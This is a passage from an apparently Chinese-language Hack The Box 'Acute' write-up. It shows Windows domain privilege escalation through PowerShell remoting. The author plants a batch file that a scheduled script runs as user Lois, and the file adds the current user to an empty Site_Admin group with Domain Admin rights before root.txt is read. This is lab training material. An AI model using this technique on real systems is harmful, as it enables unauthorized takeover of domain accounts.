+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">jmorgan</span><span class="p">\</span><span class="n">Documents</span><span class="p">&gt;</span> <span class="nb">invoke-command</span> <span class="n">-computerName</span> <span class="n">ATSSERVER</span> <span class="n">-Credential</span> <span class="nv">$cred</span> <span class="n">-ConfigurationName</span> <span class="n">dc_manage</span> <span class="n">-ScriptBlock</span> <span class="p">{</span> <span class="nb">cat </span><span class="s2">&#34;c:\program files\keepmeon\keepmeon.bat&#34;</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nb">invoke-command</span> <span class="n">-computerName</span> <span class="n">ATSSERVER</span> <span class="n">-Credential</span> <span class="nv">$cred</span> <span class="n">-ConfigurationName</span> <span class="n">dc_manage</span> <span class="n">-ScriptBlock</span> <span class="p">{</span> <span class="nb">cat </span><span class="s2">&#34;c:\program files\keepmeon\keepmeon.bat&#34;</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">REM</span> <span class="n">This</span> <span class="n">is</span> <span class="n">run</span> <span class="n">every</span> <span class="mf">5</span> <span class="n">minutes</span><span class="p">.</span> <span class="k">For</span> <span class="n">Lois</span> <span class="n">use</span> <span class="n">ONLY</span>
+</span></span><span class="line"><span class="cl"><span class="nv">@echo</span> <span class="n">off</span>
+</span></span><span class="line"><span class="cl"> <span class="k">for</span> <span class="p">/</span><span class="nb">R </span><span class="p">%</span><span class="k">%</span><span class="n">x</span> <span class="k">in</span> <span class="p">(*.</span><span class="n">bat</span><span class="p">)</span> <span class="k">do</span> <span class="p">(</span>
+</span></span><span class="line"><span class="cl"> <span class="k">if</span> <span class="n">not</span> <span class="s2">&#34;%%x&#34;</span> <span class="p">==</span> <span class="s2">&#34;%~0&#34;</span> <span class="n">call</span> <span class="s2">&#34;%%x&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span>
+</span></span></code></pre></div><p><code>keepmeon.bat</code>脚本为Lois用户使用, 每5分钟运行一次</p>
+<p><code>for /R %%x in (*.bat)</code>递归查找当前目录以及子目录的所有bat文件</p>
+<p><code>if not &quot;%%x&quot; == &quot;%~0&quot; call &quot;%%x&quot;</code>，如果和<code>%~0</code>，也就是当前这个bat文件不相同，就调用这个bat文件</p>
+<p>这里思路很简单，可以尝试以lois身份将当前用户添加到一个管理员组中，比如之前在docx中看到的</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">Lois is the only authorized personnel to change Group Membership, Contact Lois to have this approved and changed if required. Only Lois can become site admin.
+</span></span></code></pre></div><p>查看一下当前有哪些组<code>net group</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">invoke-command</span> <span class="n">-computerName</span> <span class="n">ATSSERVER</span> <span class="n">-Credential</span> <span class="nv">$cred</span> <span class="n">-ConfigurationName</span> <span class="n">dc_manage</span> <span class="n">-ScriptBlock</span> <span class="p">{</span> <span class="n">net</span> <span class="nb">group </span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">Group </span><span class="n">Accounts</span> <span class="k">for</span> <span class="p">\\</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">-------------------------------------------------------------------------------</span>
+</span></span><span class="line"><span class="cl"><span class="p">*</span><span class="n">Cloneable</span> <span class="n">Domain</span> <span class="n">Controllers</span>
+</span></span><span class="line"><span class="cl"><span class="p">*</span><span class="n">DnsUpdateProxy</span>
+</span></span><span class="line"><span class="cl"><span class="p">*</span><span class="n">Domain</span> <span class="n">Admins</span>
+</span></span><span class="line"><span class="cl"><span class="p">*</span><span class="n">Domain</span> <span class="n">Computers</span>
+</span></span><span class="line"><span class="cl"><span class="p">*</span><span class="n">Domain</span> <span class="n">Controllers</span>
+</span></span><span class="line"><span class="cl"><span class="p">*</span><span class="n">Domain</span> <span class="n">Guests</span>
+</span></span><span class="line"><span class="cl"><span class="p">*</span><span class="n">Domain</span> <span class="n">Users</span>
+</span></span><span class="line"><span class="cl"><span class="p">*</span><span class="n">Enterprise</span> <span class="n">Admins</span>
+</span></span><span class="line"><span class="cl"><span class="p">*</span><span class="n">Enterprise</span> <span class="n">Key</span> <span class="n">Admins</span>
+</span></span><span class="line"><span class="cl"><span class="p">*</span><span class="n">Enterprise</span> <span class="nb">Read-only</span> <span class="n">Domain</span> <span class="n">Controllers</span>
+</span></span><span class="line"><span class="cl"><span class="p">*</span><span class="nb">Group </span><span class="n">Policy</span> <span class="n">Creator</span> <span class="n">Owners</span>
+</span></span><span class="line"><span class="cl"><span class="p">*</span><span class="n">Key</span> <span class="n">Admins</span>
+</span></span><span class="line"><span class="cl"><span class="p">*</span><span class="n">Managers</span>
+</span></span><span class="line"><span class="cl"><span class="p">*</span><span class="n">Protected</span> <span class="n">Users</span>
+</span></span><span class="line"><span class="cl"><span class="p">*</span><span class="nb">Read-only</span> <span class="n">Domain</span> <span class="n">Controllers</span>
+</span></span><span class="line"><span class="cl"><span class="p">*</span><span class="n">Schema</span> <span class="n">Admins</span>
+</span></span><span class="line"><span class="cl"><span class="p">*</span><span class="n">Site_Admin</span>
+</span></span><span class="line"><span class="cl"><span class="n">The</span> <span class="n">command</span> <span class="n">completed</span> <span class="n">with</span> <span class="n">one</span> <span class="n">or</span> <span class="n">more</span> <span class="n">errors</span><span class="p">.</span>
+</span></span></code></pre></div><p><code>Site_Admin</code>明显不是一个默认的域用户组，可以具体查看一下这个组</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">invoke-command</span> <span class="n">-computerName</span> <span class="n">ATSSERVER</span> <span class="n">-Credential</span> <span class="nv">$cred</span> <span class="n">-ConfigurationName</span> <span class="n">dc_manage</span> <span class="n">-ScriptBlock</span> <span class="p">{</span> <span class="n">net</span> <span class="nb">group </span><span class="n">Site_Admin</span>  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">Group </span><span class="n">name</span>     <span class="n">Site_Admin</span>
+</span></span><span class="line"><span class="cl"><span class="n">Comment</span>        <span class="n">Only</span> <span class="k">in</span> <span class="n">the</span> <span class="n">event</span> <span class="n">of</span> <span class="n">emergencies</span> <span class="n">is</span> <span class="n">this</span> <span class="n">to</span> <span class="n">be</span> <span class="n">populated</span><span class="p">.</span> <span class="n">This</span> <span class="n">has</span> <span class="n">access</span> <span class="n">to</span> <span class="n">Domain</span> <span class="n">Admin</span> <span class="nb">group
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span>
+</span></span><span class="line"><span class="cl"><span class="n">Members</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">-------------------------------------------------------------------------------</span>
+</span></span><span class="line"><span class="cl"><span class="n">The</span> <span class="n">command</span> <span class="n">completed</span> <span class="n">successfully</span><span class="p">.</span>
+</span></span></code></pre></div><p>Comment显示只在紧急情况下才需要写入，并且具有Domain Admin group的权限，当前这个组并没有任何成员，可以写一个bat脚本，调用lois的权限，将当前用户加入到Site_Admin这个高权限用户组中.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">invoke-command</span> <span class="n">-computerName</span> <span class="n">ATSSERVER</span> <span class="n">-Credential</span> <span class="nv">$cred</span> <span class="n">-ConfigurationName</span> <span class="n">dc_manage</span> <span class="n">-ScriptBlock</span> <span class="p">{</span> <span class="nb">set-content</span> <span class="n">-Path</span> <span class="s2">&#34;c:\program files\keepmeon\aaa.bat&#34;</span> <span class="n">-Value</span> <span class="s2">&#34;net group site_admin awallace /add&#34;</span><span class="p">}</span>
+</span></span></code></pre></div><p>等待片刻之后能看到把当前用户加入到了site_admin组中</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">utils</span><span class="p">&gt;</span> <span class="nb">invoke-command</span> <span class="n">-computerName</span> <span class="n">ATSSERVER</span> <span class="n">-Credential</span> <span class="nv">$cred</span> <span class="n">-ConfigurationName</span> <span class="n">dc_manage</span> <span class="n">-ScriptBlock</span> <span class="p">{</span> <span class="n">net</span> <span class="nb">group </span><span class="n">site_admin</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nb">invoke-command</span> <span class="n">-computerName</span> <span class="n">ATSSERVER</span> <span class="n">-Credential</span> <span class="nv">$cred</span> <span class="n">-ConfigurationName</span> <span class="n">dc_manage</span> <span class="n">-ScriptBlock</span> <span class="p">{</span> <span class="n">net</span> <span class="nb">group </span><span class="n">site_admin</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Group </span><span class="n">name</span>     <span class="n">Site_Admin</span>
+</span></span><span class="line"><span class="cl"><span class="n">Comment</span>        <span class="n">Only</span> <span class="k">in</span> <span class="n">the</span> <span class="n">event</span> <span class="n">of</span> <span class="n">emergencies</span> <span class="n">is</span> <span class="n">this</span> <span class="n">to</span> <span class="n">be</span> <span class="n">populated</span><span class="p">.</span> <span class="n">This</span> <span class="n">has</span> <span class="n">access</span> <span class="n">to</span> <span class="n">Domain</span> <span class="n">Admin</span> <span class="nb">group
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span>
+</span></span><span class="line"><span class="cl"><span class="n">Members</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">-------------------------------------------------------------------------------</span>
+</span></span><span class="line"><span class="cl"><span class="n">awallace</span>                 
+</span></span><span class="line"><span class="cl"><span class="n">The</span> <span class="n">command</span> <span class="n">completed</span> <span class="n">successfully</span><span class="p">.</span>
+</span></span></code></pre></div><p>这样就可以通过<code>invoke-command</code>读取<code>root flag</code>了</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">utils</span><span class="p">&gt;</span> <span class="nb">invoke-command</span> <span class="n">-computerName</span> <span class="n">ATSSERVER</span> <span class="n">-Credential</span> <span class="nv">$cred</span> <span class="n">-ConfigurationName</span> <span class="n">dc_manage</span> <span class="n">-ScriptBlock</span> <span class="p">{</span> <span class="nb">get-content</span> <span class="n">c:</span><span class="p">\</span><span class="n">users</span><span class="p">\</span><span class="n">administrator</span><span class="p">\</span><span class="n">desktop</span><span class="p">\</span><span class="n">root</span><span class="p">.</span><span class="py">txt</span> <span class="p">}</span>
+</span></span></code></pre></div>
+          
+          
+          
+        </div>
+
+        
+
+        
+
+        
+
+        
+
+      </div>
+
+      
+      
+        
+        
+          
+          
+        
+        
+        
+        <script
+          type="text/javascript"
+          src="/js/page.min.54b6f4371722649edbe871e431d8670d670878c22be8f36e229fe53cc9b786fe25a834def5e6de621f7a3e37b72bc8cd73839aa5ed907ed6cbd45cd3e1b0fa20.js"
+          integrity="sha512-VLb0NxciZJ7b6HHkMdhnDWcIeMIr6PNuIp/lPMm3hv4lqDTe9ebeYh96Pje3K8jNc4Oape2QftbL1FzT4bD6IA=="
+          data-oid="views_posts\HTB-Acute\index.md"
+          data-oid-likes="likes_posts\HTB-Acute\index.md"></script>
+      
+
+    </section>
+    <footer class="pt-8 max-w-prose print:hidden">
+      
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600">
+      <div class="flex justify-between pt-3">
+        <span>
+          
+            <a class="flex group mr-3" href="/posts/htb-crafty/">
+              <span
+                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+              <span
+                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
+              <span class="flex flex-col">
+                <span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >HTB Crafty</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2025-07-20T16:32:58&#43;08:00">20 July 2025</time>
+                  
+                </span>
+              </span>
+            </a>
+          
+        </span>
+        <span>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+      
+    </footer>
+  </article>
+
+        <div id="top-scroller" class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0">
+  <a
+    href="#the-top"
+    class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+    aria-label="Scroll to top"
+    title="Scroll to top">
+    &uarr;
+  </a>
+</div>
+
+      </main><footer id="site-footer" class="py-10 print:hidden">
+  
+  
+    
+  
+  <div class="flex items-center justify-between">
+    
+    
+      <p class="text-sm text-neutral-500 dark:text-neutral-400">
+          &copy;
+          2025
+          
+      </p>
+    
+
+    
+    
+      <p class="text-xs text-neutral-500 dark:text-neutral-400">
+        
+        
+        Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+          href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+          href="https://blowfish.page/" target="_blank" rel="noopener noreferrer">Blowfish</a>
+      </p>
+    
+
+  </div>
+  <script>
+    
+    mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
+      margin: 24,
+      background: 'rgba(0,0,0,0.5)',
+      scrollOffset: 0,
+    })
+    
+  </script> 
+  
+  <script
+    type="text/javascript"
+    src="/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js"
+    integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh&#43;sCQ0E53ghYrxgYqw&#43;0GCRyIEpA=="></script>
+  
+  
+</footer>
+<div
+  id="search-wrapper"
+  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-500"
+  data-url="https://ink410.github.io/">
+  <div
+    id="search-modal"
+    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800">
+    <header class="relative z-10 flex items-center justify-between flex-none px-2">
+      <form class="flex items-center flex-auto min-w-0">
+        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
+          
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="Search"
+          tabindex="0">
+      </form>
+      <button
+        id="close-search-button"
+        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="Close (Esc)">
+        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+
+      </button>
+    </header>
+    <section class="flex-auto px-2 overflow-auto">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+    </div>
+  </body>
+  
+</html>
